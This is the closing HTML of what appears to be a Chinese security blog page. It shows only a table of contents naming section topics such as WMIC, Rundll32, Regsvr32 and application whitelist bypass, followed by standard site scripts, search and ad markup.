class="toc-number">11.4.1.</span> <span class="toc-text">File Explorer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMIC"><span class="toc-number">11.4.2.</span> <span class="toc-text">WMIC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rundll32"><span class="toc-number">11.4.3.</span> <span class="toc-text">Rundll32</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">11.5.</span> <span class="toc-text">应用白名单绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Regsvr32"><span class="toc-number">11.5.1.</span> <span class="toc-text">Regsvr32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bourne-Again-Shell-Bash"><span class="toc-number">11.5.2.</span> <span class="toc-text">Bourne Again Shell (Bash)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%8A%80%E6%9C%AF"><span class="toc-number">11.6.</span> <span class="toc-text">其他技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Shortcuts-%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F"><span class="toc-number">11.6.1.</span> <span class="toc-text">Shortcuts 快捷方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#No-PowerShell"><span class="toc-number">11.6.2.</span> <span class="toc-text">No PowerShell!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%B0%E5%AE%9E%E5%9C%BA%E6%99%AF"><span class="toc-number">11.7.</span> <span class="toc-text">现实场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">11.8.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%B5%84%E6%BA%90"><span class="toc-number">11.8.1.</span> <span class="toc-text">其他资源</span></a></li></ol></li></ol></li></ol>
                </div>
            </button>
            

            

            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
        </div>
    </div>
</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
</div><!-- hexo injector body_end start -->
  <script>
  const CODE_CONFIG = {
    beautify: undefined,
    highlightCopy: undefined,
    highlightLang: undefined,
    highlightHeightLimit: undefined,
    isHighlightShrink: undefined,
    copy: {
      success: 'undefined',
      error: 'undefined',
      noSupport: 'undefined',
    }
  };
  console.log(
    `%c hexo-shiki-plugin %c v1.0.27 %c https://github.com/nova1751/hexo-shiki-plugin`,
    "color: #fff; background: #5f5f5f",
    "color: #fff; background: #80c8f8",
    ""
  );
  </script>
  <!-- hexo injector body_end end --></body></html>